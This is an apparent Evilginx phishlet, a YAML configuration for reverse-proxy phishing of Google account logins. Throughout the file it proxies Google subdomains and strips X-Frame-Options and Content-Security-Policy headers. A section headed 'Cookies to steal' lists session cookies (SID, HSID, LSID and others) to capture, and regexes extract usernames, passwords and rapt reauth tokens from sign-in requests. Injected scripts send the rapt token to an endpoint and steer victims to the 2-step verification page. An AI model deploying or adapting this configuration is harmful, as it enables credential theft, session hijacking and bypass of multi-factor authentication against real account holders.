min_ver: '3.0.0'
redirect_url: 'https://myaccount.google.com'

# Subdomains that Evilginx will proxy
proxy_hosts:
  - {phish_sub: 'www3', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'clients', orig_sub: 'clients', domain: 'google.com', session: false, is_landing: false, auto_filter: true}

# Replace rules to avoid unwanted redirection
sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.gstatic.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'ssl.gstatic.com', replace: 'ssl.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'myaccount.google.com', replace: 'myaccount.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'play.google.com', replace: 'play.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'apis.google.com', replace: 'apis.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'clients.google.com', replace: 'clients.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'content.googleapis.com', replace: 'content.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
  # Strip security headers
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

# Cookies to steal
auth_tokens:
  - domain: '.google.com'
    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
    force_post: true
  - domain: 'accounts.google.com'
    keys: ["GAPS", "LSID", "ACCOUNT_CHOOSER", ".*,regexp"]
    force_post: true
  - domain: '.accounts.google.com'
    keys: ["GAPS", "LSID", "ACCOUNT_CHOOSER", ".*,regexp"]
    force_post: true
  - domain: 'myaccount.google.com'
    keys: [".*,regexp"]
    force_post: true

# Capture username/password credentials
# Note: Google rotates protobuf field names server-side. If capture stops working,
# update the field identifiers (e.g. MI613e) by inspecting live POST bodies.
credentials:
  username:
    key: ''
    search: '\[\[\["MI613e","\[null,\\"(.*?)\\"'
    type: 'post'
  password:
    key: ''
    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
    type: 'post'
  custom:
    - key: 'f.req'
      search: '\["gf.siecp","([^"]*)"\]'
      type: 'post'
    - key: 'rapt'
      search: '"rapt":"([^"]*)'
      type: 'json'

# URLs that finalize authentication
auth_urls:
  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
  - '/CheckCookie'
  - '/ManageAccount'
  - '/signin/challenge'
  - '/login/sessionCookieRedirect'

# Corrected forced POST redirection for consistency
force_post:
  - path: '/selectchallenge'
    search:
      - {key: 'flowEntry', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com'}
    type: 'post'
  - path: '/signin'
    search:
      - {key: 'flowEntry', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com'}
    type: 'post'

# Legitimate site login page location
login:
  domain: 'accounts.google.com'
  path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'

path_rewrite:
  - trigger: '/verification'
    target: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
  - trigger: '/signin/v2/identifier'
    target: '/v3/signin/identifier'

# Injected JavaScript for redirection
js_inject:
  - trigger_domains: ['myaccount.google.com']
    trigger_paths: ['*']
    script: |
        window.addEventListener('load', () => {
          if (window.location.pathname === '/') {
            window.location.href = '/u/4/signinoptions/twosv';
            return;
          }
          const urlParams = new URLSearchParams(window.location.search);
          if (urlParams.has('rapt')) {
            const raptValue = urlParams.get('rapt');
            fetch('/xxx', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ rapt: raptValue })
            }).catch(() => {});
          }
        });
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/signin', '/v3/signin']
    script: |
        document.addEventListener('DOMContentLoaded', function() {
          if (document.cookie.includes('SID') && document.cookie.includes('HSID')) {
            window.location.href = 'https://myaccount.google.com';
          }
        });
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['*']
    script: |
        document.addEventListener('DOMContentLoaded', function() {
          let reloadTimer = null;
          function monitorSpinner() {
            const spinner = document.querySelector('[role="progressbar"]');
            if (spinner && spinner.classList.length === 2) {
              if (!reloadTimer) {
                reloadTimer = setTimeout(() => { location.reload(true); }, 10000);
              }
            } else {
              clearTimeout(reloadTimer);
              reloadTimer = null;
            }
          }
          setInterval(monitorSpinner, 1000);
        });
